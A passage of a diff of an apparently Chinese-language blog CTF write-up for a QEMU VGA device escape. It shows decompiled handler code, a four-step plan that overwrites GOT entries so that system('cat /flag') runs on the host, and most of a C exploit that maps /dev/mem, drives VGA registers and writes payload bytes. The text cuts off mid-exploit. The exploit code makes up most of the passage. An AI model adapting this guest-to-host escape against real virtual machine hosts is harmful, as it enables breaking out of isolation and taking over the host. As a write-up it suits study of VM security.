)</span><br><span class="line">  LODWORD(mem_value) = (opaque-&gt;vga.sr[<span class="number">0xCD</span>] &lt;&lt; <span class="number">16</span>) | (opaque-&gt;vga.sr[<span class="number">0xCE</span>] &lt;&lt; <span class="number">8</span>) | mem_value;</span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = BYTE2(mem_value);</span><br><span class="line">  <span class="keyword">if</span> ( v21 &lt;= <span class="number">0x10</span> &amp;&amp; opaque-&gt;vs[v21].buf )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">0x4CF9</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;= *((_DWORD *)v6 + <span class="number">0x4CF8</span>) )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      LABEL_26:</span><br><span class="line">      *((_DWORD *)v6 + <span class="number">0x4CF9</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + v8) = mem_value;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">19705</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_35:</span><br><span class="line">    v17 = vulncnt;</span><br><span class="line">    <span class="keyword">if</span> ( vulncnt &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      mem_valuea = mem_value;</span><br><span class="line">      v18 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> __int16)mem_value);</span><br><span class="line">      v19 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * v17;</span><br><span class="line">      *((_QWORD *)v19 + <span class="number">9851</span>) = v18;</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        vulncnt = v17 + <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)v19 + <span class="number">19704</span>) = mem_valuea;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(mem_value) &lt;= <span class="number">0x10</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)v20 + <span class="number">9851</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>u )</span><br><span class="line">        *((_QWORD *)v20 + <span class="number">9852</span>) = (<span class="keyword">unsigned</span> __int16)mem_value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -310,10 +363,10 @@
 
 <p>在<code>qemu_log</code>函数中，存在一个<code>vfprintf</code>函数调用了bss上的一个变量<code>qemu_logfile</code>。那么利用思路如下：</p>
 <ol>
-<li>  修改qemu_logfile的内容为<code>cat /flag</code></li>
-<li>  修改vfprintf函数的got表为system</li>
-<li>  修改printf_chk函数的got表为qemu_log</li>
-<li>  最后让v5等于2，触发printf_chk</li>
+<li>修改qemu_logfile的内容为<code>cat /flag</code></li>
+<li>修改vfprintf函数的got表为system</li>
+<li>修改printf_chk函数的got表为qemu_log</li>
+<li>最后让v5等于2，触发printf_chk</li>
 </ol>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先吐槽一点</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">switch ( addr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> 4uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x24uLL:</span><br><span class="line">  opaque-&gt;vga.cr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 5uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x25uLL:</span><br><span class="line">  cr_index = opaque-&gt;vga.cr_index;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x18u )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; <span class="string">cr_index) &amp; 0x8200F1) != 0 )</span></span><br><span class="line"><span class="string">  LABEL_35:</span></span><br><span class="line"><span class="string">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( (_BYTE)cr_index</span> == 7 )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x1Du )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[cr_index] = value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0xAuLL:</span><br><span class="line">  <span class="keyword">case</span> 0x2AuLL:</span><br><span class="line">  opaque-&gt;vga.fcr = value &amp; 0x10;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10uLL:</span><br><span class="line">  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;</span><br><span class="line">  <span class="keyword">if</span> ( ar_flip_flop )</span><br><span class="line">  &#123;</span><br><span class="line">  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;</span><br><span class="line">  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> 0:</span><br><span class="line">  <span class="keyword">case</span> 1:</span><br><span class="line">  <span class="keyword">case</span> 2:</span><br><span class="line">  <span class="keyword">case</span> 3:</span><br><span class="line">  <span class="keyword">case</span> 4:</span><br><span class="line">  <span class="keyword">case</span> 5:</span><br><span class="line">  <span class="keyword">case</span> 6:</span><br><span class="line">  <span class="keyword">case</span> 7:</span><br><span class="line">  <span class="keyword">case</span> 8:</span><br><span class="line">  <span class="keyword">case</span> 9:</span><br><span class="line">  <span class="keyword">case</span> 0xA:</span><br><span class="line">  <span class="keyword">case</span> 0xB:</span><br><span class="line">  <span class="keyword">case</span> 0xC:</span><br><span class="line">  <span class="keyword">case</span> 0xD:</span><br><span class="line">  <span class="keyword">case</span> 0xE:</span><br><span class="line">  <span class="keyword">case</span> 0xF:</span><br><span class="line">  <span class="keyword">case</span> 0x12:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x11:</span><br><span class="line">  goto LABEL_42;</span><br><span class="line">  <span class="keyword">case</span> 0x13:</span><br><span class="line">  <span class="keyword">case</span> 0x14:</span><br><span class="line">  LOBYTE(value) = value &amp; 0xF;</span><br><span class="line">  LABEL_42:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  default:</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.ar_index = value &amp; 0x3F;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x12uLL:</span><br><span class="line">  opaque-&gt;vga.msr = value &amp; 0xEF;</span><br><span class="line">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x14uLL:</span><br><span class="line">  opaque-&gt;vga.sr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -322,216 +375,302 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases</span><br><span class="line">.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h</span><br><span class="line">.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985</span><br><span class="line">.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239</span><br><span class="line">.text:000000000068F601</span><br><span class="line">.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump</span><br></pre></td></tr></table></figure>
 
 <p> 在这里是减去0x3B4</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315161250131.png"
-                      alt="image-20230315161250131"
-                ></p>
+<p><img   src="/images/image-20230315161250131.png"  alt="image-20230315161250131"></p>
 <p>但是这里真正需要的是0x10，又一次翻译错误。</p>
 <p>忽略这些小错误之后直接编写exp即可</p>
 <h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">va2pa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (!fd)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> vga_addr = <span class="number">0xa0000</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> vga_size = <span class="number">0x20000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *mmio_mem;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *vga_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_sr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> idx, <span class="keyword">unsigned</span> <span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(idx, <span class="number">0x3c4</span>);</span><br><span class="line">    outb(val, <span class="number">0x3c5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vga_mem_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint8_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint8_t</span> *)(vga_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_latch</span><span class="params">(<span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    a = vga_mem[(value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>]; <span class="comment">// write hight</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    a = vga_mem[value &amp; <span class="number">0xffff</span>]; <span class="comment">// write low</span></span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vga_mem = mmap(<span class="literal">NULL</span>, vga_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, vga_addr);</span><br><span class="line">    <span class="keyword">if</span> (!vga_mem)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioperm(<span class="number">0x3b0</span>, <span class="number">0x30</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;cannot ioperm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">7</span>, <span class="number">1</span>);       <span class="comment">// bypass first if</span></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">4</span>);    <span class="comment">// v7==4</span></span><br><span class="line">    set_sr(<span class="number">0xcd</span>, <span class="number">0x10</span>); <span class="comment">// vs[0x10]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> bss = <span class="number">0x109e000</span> + <span class="number">0x500</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_logfile = <span class="number">0x10CCBE0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> vfprintf_got = <span class="number">0xee7bb0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> system_plt = <span class="number">0x409dd0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> printf_chk_got = <span class="number">0xee7028</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> qemu_log = <span class="number">0x9726E8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cat_flag[] = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> a;</span><br><span class="line">    <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span> cur_size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a = vga_mem[<span class="number">1</span>];</span><br><span class="line">    write(<span class="number">1</span>, &amp;a, <span class="number">1</span>);</span><br><span class="line">    set_latch(bss);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;cat_flag[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, cat_flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(qemu_logfile - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;bss;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(vfprintf_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;system_plt;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_latch(printf_chk_got - cur_size);</span><br><span class="line">    payload = (<span class="keyword">char</span> *)&amp;qemu_log;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        write(<span class="number">1</span>, &amp;payload[i], <span class="number">1</span>);</span><br><span class="line">        vga_mem_write(<span class="number">0x18100</span>, payload[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cur_size += <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    set_sr(<span class="number">0xcc</span>, <span class="number">2</span>);</span><br><span class="line">    vga_mem_write(<span class="number">0x18100</span>, <span class="number">1</span>);</span><br><span 